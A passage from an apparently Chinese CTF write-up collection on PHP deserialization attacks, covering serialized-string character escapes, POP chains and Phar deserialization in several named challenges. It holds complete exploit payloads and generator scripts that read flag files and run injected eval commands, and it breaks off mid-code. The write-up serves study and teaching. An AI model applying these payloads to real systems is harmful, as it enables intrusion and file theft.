php反序列化时会忽略后面的非法部分&quot;;i:1;s:5:“world”;}，可以反序列化成功。所以我们可以多写几个where，这样在替换时每多出的一个r就为我们构造字符串提供一个位置，我们需要&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;加在后面用来读config.php文件。共34个字符，因此需要加34的where，所以最后需要输入的数据为： 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 这样在反序列化后大概就是这情况： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; 此时这34个字符会包含在204个总字符内。 替换为hacker后： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:5:&quot;ca01h&quot;;s:5:&quot;photo&quot;;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125; 因为hacker比where多一个字符，所以正好占据了这多余的34个字符，使得其逃逸了出来，便可以成功反序列化。 payload构造成功了，再找输入点。 md5(Array()) = null sha1(Array()) = null ereg(pattern,Array()) = null preg_match(pattern,Array()) = false strcmp(Array(), “abc”) = null strpos(Array(),“abc”) = null strlen(Array()) = null 下面的这个preg_math可以用数组绕过 12if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); 参考 https://xz.aliyun.com/t/7570#toc-9 http://www.lin2zhen.top/index.php/archives/73/ [安洵杯 2019]easy_serialize_php 考点 phpinfo信息搜集 PHP反序列化字符逃逸 解题 上来就直接个源代码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 很容易看到有一个变量覆盖的漏洞，但是还不知道怎么利用，接着往下看。 传入f=phpinfo可以看到someting，试试看 在每个php文件前面都自动包含了d0g3_f1ag.php，直接访问没有任何回显。 当$function=show_image的时候，会调用file_get_contents函数读取文件内容，如果我们能控制$userinfo['img']参数为d0g3_f1ga.php就可以读flag。 但是如果传入img_path参数的话会先对其base64编码然后sha1加密，是一个不可逆的操作。 那么再去看另外两个参数function和user，其中user也是硬编码无法利用，只能从function参数入手。此外，我们还要注意到有一个filter函数用于过滤php、flag、php5、php4和fl1g关键字。 任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。 那么这个地方就可以很明显的用到反序列化字符逃逸的漏洞，用于覆盖$userinfo['img']参数为d0g3_f1ag.php。首先看一下一个正常的序列化后的$_SESSION是什么样子的： 12345php &gt; $_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;php &gt; $_SESSION[&quot;user&quot;] = &#x27;phpinfo&#x27;;php &gt; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);php &gt; print_r(serialize($_SESSION));a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 我们要覆盖掉序列化后的img参数，也就是要插入s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;，即 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 这里我们就可以利用变量覆盖漏洞来覆盖$_SESSION[&quot;user&quot;]和$_SESSION[&quot;function&quot;]的值。 假如我们赋值$_SESSION[&quot;user&quot;]=flagflagflagflagflagflag，$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;，那么序列化后$serialize_info为： 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; 过滤之后， 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; 其中&quot;;s:8:&quot;function&quot;;s:59:&quot;a刚好是24个字符，这样就可以控制后面的序列化内容。 所以最终的payload为： 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image 参考 官方writeup AD攻防实验室——PHP反序列化字符逃逸 [GYCTF2020]EasyThinking 考点 POP链构造 PHP反序列化字符逃逸 解题 下载www.zip审计源码 123456789101112131415161718&lt;?phprequire_once(&#x27;lib.php&#x27;);echo &#x27;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;&#x27;;if ($_SESSION[&#x27;login&#x27;]!=1)&#123; echo &quot;你还没有登陆呢！&quot;;&#125;$users=new User();$users-&gt;update();if($_SESSION[&#x27;login&#x27;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125;?&gt; update.php页面提示需要登录才能获得flag。 主要代码都在lib.php中，先来看一下User类 12345678910111213141516171819202122232425262728293031323334353637383940class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;; return $this-&gt;id; &#125; &#125;&#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125;&#125; login函数中调用dbCtrl类中的login函数执行SQL语句，update函数中有一个反序列化的地方，参数是getNewInfo函数的返回值。 getNewInfo函数中age和nickname参数是可控的，传给了Info类 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age&#x3D;$age; $this-&gt;nickname&#x3D;$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; 然后还要经过一次safe函数 1234function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; 替换之后改变了数据的结构，类似0CTF2016 piapiapia这道题，很可能会引发字符逃逸的漏洞。 接着看dbCtrl类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; $this-&gt;token=$_SESSION[&#x27;token&#x27;]; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;用户不存在!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;密码错误！&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125; 我们可以知道的信息: 用户名存在，且$this-&gt;password的md5的值与数据库查询用户密码相同。 或者token的值为admin 这里有点像2019GXYCTF中的babySqli，是不是我们控制了sql语句，使用 select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=? $this-&gt;password=1(1的md5的值为c4ca4238a0b923820dcc509a6f75849b) 就可以通过登录密码的验证。 接下来构造POP链，先来找一下__destruct魔法方法，在UpdateHelper类中 12345678910111213Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125; 发现会把sql给echo出来，如果$sql=new User()的话，就会触发User内的__toString()魔术方法，该魔术方法内调用了$nickname属性的update()方法。虽然dbCtrl对象拥有update()方法，但是$nickname实例化成对象没意义。接着看Info类 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; 这时我们看到了Info类内有__call()魔术方法，如果调用了一个不存在的属性，__call()方法就会触发，正好Info类没有update()方法，那么如果User内的$nickname实例化为Info对象，调用不存在update()就会触发这个__call()，这个__call()魔术方法将Ctrlcase的login()函数结果输出出来。 这样我们只需要$CtrlCase变量实例化为dbCtrl类的对象，这句话相当于相当于dbCtrl::login($sql)，而且可知dbCtrl::login($sql)中的$sql参数，实际上是User类中的$age变量传入的，参数就是我们控制的了。 exp： 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass User&#123; public $age = null; public $nickname = null; public function __construct() &#123; $this-&gt;age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;; $this-&gt;nickname = new Info(); &#125;&#125;class Info&#123; public $CtrlCase; public function __construct() &#123; $this-&gt;CtrlCase = new dbCtrl(); &#125;&#125;class UpdateHelper&#123; public $sql; public function __construct() &#123; $this-&gt;sql = new User(); &#125;&#125;class dbCtrl&#123; public $name = &quot;admin&quot;; public $password = &quot;1&quot;;&#125;$o = new UpdateHelper;echo serialize($o); 序列化的结果 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125; 构造好了POP链，接下来就是要找到触发反序列化的点。 从update.php 可以跟进User类的update()函数： 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //这个功能还没有写完 先占坑&#125; 继续跟进getNewInfo()函数 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; 这个函数的返回值是一个先序列化在经过safe()函数处理的Info类对象。 所以最终能够反序列化的不是我们直接传入的字符串，而是用我们的值实例化一个Info类的对象，然后对这个对象进行实例化，再对这个序列化结果进行safe()处理，最后得到的值再进行反序列化。 所以想要发序列化我们的payload，就得控制 Info类对象的序列化串，看一下这个序列化串的格式 （假设age=20；nickname=lethe）： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:5:&quot;lethe&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 这里的原理有点类似注入，都是闭合，先看一下我们构造的payload如下，未逃逸字符串前: 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; 可以看到我们在已序列化串前面加上了&quot;;s:8:&quot;CtrlCase&quot;;，在最后加上了一个&#125;（整个长度为263），这样我们将其作为new Info($age,$nickname)的nickname传入时，序列化的结果如下： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:8:&quot;nickname&quot;;s:263:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 但是长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。 这时候就需要用到字符逃逸的原理了，我们在payload的前面加上263个union，在经过safe函数之后，union全部被替换成hacker，也就是相当于新增了263个字符，这样就导致跟在后面的长度为263个字符的payload成功逃逸。 而之所前面构造的时候在最后面加一个&#125;，是因为Info类的对象只有3个变量，&#125;前面已经有3个变量满足了序列化串的要求了，所以加一个&#125;来闭合整个序列化串。 最终payload如下： 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; 在update.php内post提交age=123&amp;nickname=后面接上输出结果，就会得到admin密码的md5。 SWPU2019 SimplePHP 考点 文件包含 Phar反序列化 解题 查看文件页面有文件包含，可以读取源码： file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; class.php中有一个很明显的POP链，此外，由于没有unserialize函数触发反序列化，那么就只能上传一个phar来触发反序列化。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#x27;str&#x27;] = $test;$test-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;$phar = new Phar(&quot;exp.phar&quot;); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;); //固定的$phar-&gt;setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //随便写点什么生成个签名$phar-&gt;stopBuffering(); 生成exp.phar后改后缀为gif，然后查看上传的文件名 最后使用phar协议读取该文件。 解码得到flag。 GXYCTF2019 Babysqli v3 考点 弱口令 PHP反序列化 解题 弱口令爆破。。。。。得到admin/password。 PHP伪协议读取源码php://filter/read=convert.base64-encode/resource=home.php home.php 1234567891011121314151617181920212223242526&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION[&#x27;user&#x27;]))&#123; if(isset($_GET[&#x27;file&#x27;]))&#123; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;hacker!&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;当前引用的是 &quot;.$file; require $file; &#125; &#125; else&#123; die(&quot;no permission!&quot;); &#125;&#125;?&gt; upload.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 上传文件 &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader&#123; public $Filename; public $cmd; public $token; function __construct()&#123; $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#x27;name&#x27;]))&#123; $this-&gt;Filename = $_GET[&#x27;name&#x27;]; &#125; else&#123; $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext; &#125; $this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;; $this-&gt;token = $_SESSION[&#x27;user&#x27;]; &#125; function upload($file)&#123; global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123; $this-&gt;cmd = &quot;die(&#x27;illegal filename!&#x27;);&quot;; &#125; else&#123; if($file[&#x27;size&#x27;] &gt; 1024)&#123; $this-&gt;cmd = &quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;; &#125; else&#123; $this-&gt;cmd = &quot;move_uploaded_file(&#x27;&quot;.$file[&#x27;tmp_name&#x27;].&quot;&#x27;, &#x27;&quot; . $this-&gt;Filename . &quot;&#x27;);&quot;; &#125; &#125; &#125; function __toString()&#123; global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; &#125; function __destruct()&#123; if($this-&gt;token != $_SESSION[&#x27;user&#x27;])&#123; $this-&gt;cmd = &quot;die(&#x27;check token falied!&#x27;);&quot;; &#125; eval($this-&gt;cmd); &#125;&#125;if(isset($_FILES[&#x27;file&#x27;])) &#123; $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader))&#123; echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); &#125;&#125;?&gt; 预期解 Phar反序列化 先任意上传一个文件获得token的值 生成phar文件 123456789101112131415161718&lt;?phpclass Uploader&#123; public $Filename; public $cmd; public $token;&#125;$upload = new Uploader();$upload-&gt;cmd = &quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;;$upload-&gt;Filename = &#x27;test&#x27;;$upload-&gt;token = &#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;;$phar = new Phar(&quot;exp.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);$phar-&gt;setMetadata($upload); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); 然后将生成的phar上传 得到路径/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt 然后将这个路径带上phar://作为name参数的值，再随意上传一个文件，因为$this-&gt;Filename被我们手工指定为phar，触发了phar反序列化导致命令执行。 非预期解1 关键的地方在于正则写的有问题 123456if(isset($_GET[&#x27;name&#x27;]) and 